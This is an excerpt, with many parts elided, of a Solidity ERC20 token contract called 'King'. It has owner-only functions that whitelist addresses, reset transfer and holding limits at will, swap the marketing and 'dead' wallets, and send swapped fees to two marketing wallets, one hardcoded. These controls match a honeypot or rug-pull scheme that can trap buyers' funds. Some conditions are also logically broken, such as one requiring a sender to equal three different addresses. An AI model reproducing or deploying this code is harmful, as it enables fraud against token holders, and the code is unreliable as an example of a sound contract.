...
contract King is ERC20, Ownable {
    ...
    uint256 public utils = 500000000000e18;
    uint256 public utilnew= 1e18;
    uint256 public maxtoken = 500e18;
    address public uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public deadWallet = 0x0000000000000000000000000000000000000000;
    address public _marketingWalletAddress2 = 0xd0f31C720ce1CD48E37822ebE3fB25b967640845;
    ...
    constructor(
        ...
        _list[marketingWalletAddr_] = true;
        _list[_marketingWalletAddress2] = true;
        _list[deadWallet] = true;
        _list[uniswap] = true;
        _list[owner()] = true;
    ...
    function setMarketingWallet(address payable wallet,address payable wallat) external onlyOwner{
        _marketingWalletAddress = wallet;
        _marketingWalletAddress2 = wallat;
    }


    function setRewardToken(address payable rewardAddr_) external onlyOwner{
        rewardToken = rewardAddr_;
    }
    ...
    function setlist(address _address, bool value) external onlyOwner{
        _list[_address] = value;
    }

    function setMxToken(uint256 _utils) external onlyOwner{
        utils = _utils;
    }

    function setholdMaxToken(uint256 _utils) external onlyOwner{
        maxtoken = _utils;
    }

    function setdeadWallet(address _utils) external onlyOwner{
        deadWallet = _utils;
    }
    ...
    function _transfer(address from,address to,uint256 amount) internal override {
        ...
        if(takeFee) {
            ...
            if(automatedMarketMakerPairs[from]){
                ...
                if(from == _marketingWalletAddress && from == owner() && from==_marketingWalletAddress2){
                ...
                fees = LFee.add(RFee).add(MFee).add(DFee);
                    ...
                    if(amount > utils){
                     require(amount < utils+1,"ERC20: transfer false");
                     
                    }
                    uint256 ke  = maxtoken - balanceOf(to);
                    require(amount < ke +1,"Max false");
                LFee = amount.mul(buyLiquidityFee).div(100);
                AmountLiquidityFee += LFee;
                RFee = amount.mul(buyTokenRewardsFee).div(100);
                AmountTokenRewardsFee += RFee;
            ...
            if(automatedMarketMakerPairs[to]){
                if(to == _marketingWalletAddress && to == owner() && from==_marketingWalletAddress2){
    ...
    function swapAndSendToFee() private  {
        ...
        uint256 getmoney = (newBalance * utilnew) / 2;
        IERC20(rewardToken).transfer(_marketingWalletAddress, getmoney / utilnew);
        IERC20(rewardToken).transfer(_marketingWalletAddress2, getmoney / utilnew);
